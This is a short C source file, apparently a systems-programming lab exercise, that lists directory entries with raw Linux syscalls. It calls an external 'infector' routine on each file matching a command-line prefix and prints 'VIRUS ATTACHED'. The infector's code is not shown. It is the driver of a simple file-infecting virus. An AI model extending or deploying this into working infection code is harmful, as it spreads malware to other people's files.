#include "Util.h"
#include "dirent.h"

#define SYS_WRITE 4
#define STDOUT 1
#define SYS_OPEN 5
#define O_RDWR 2
#define SYS_SEEK 19
#define SYS_GETDENTS 141
#define SEEK_SET 0
#define SHIRA_OFFSET 0x291

struct linux_dirent
{
  unsigned long d_ino;     /* Inode number */
  unsigned long d_off;     /* Offset to next linux_dirent */
  unsigned short d_reclen; /* Length of this linux_dirent */
  char d_name[];           /* Filename (null-terminated) */
                           /* length is actually (d_reclen - 2 -
                                                  offsetof(struct linux_dirent, d_name)) */
};

extern int system_call();
extern int infector();

int main(int argc, char *argv[], char *envp[])
{
  int file_descriptor;
  long i;
  int bytes_read;
  char buffer[8192];
  struct linux_dirent *d;
  char *prefix;

  for (i = 1; i < argc; i++)
    if (argv[i][0] == '-' && argv[i][1] == 'a')
      prefix = argv[i] + 2;

  file_descriptor = system_call(SYS_OPEN, ".", 0, 0644);
  if (file_descriptor < 0)
    return 0x55;

  bytes_read = system_call(SYS_GETDENTS, file_descriptor, buffer, 8192);
  if (bytes_read < 0)
    return 0x55;

  for (i = 0; i < bytes_read;)
  {
    d = (struct linux_dirent *)(buffer + i);
    system_call(SYS_WRITE, STDOUT, d->d_name, strlen(d->d_name));

    if (prefix && strncmp(prefix, d->d_name, strlen(prefix)) == 0)
    {
      infector(d->d_name);
      system_call(SYS_WRITE, STDOUT, " VIRUS ATTACHED", 15);
    }

    system_call(SYS_WRITE, STDOUT, "\n", 1);
    i += d->d_reclen;
  }

  return 0;
}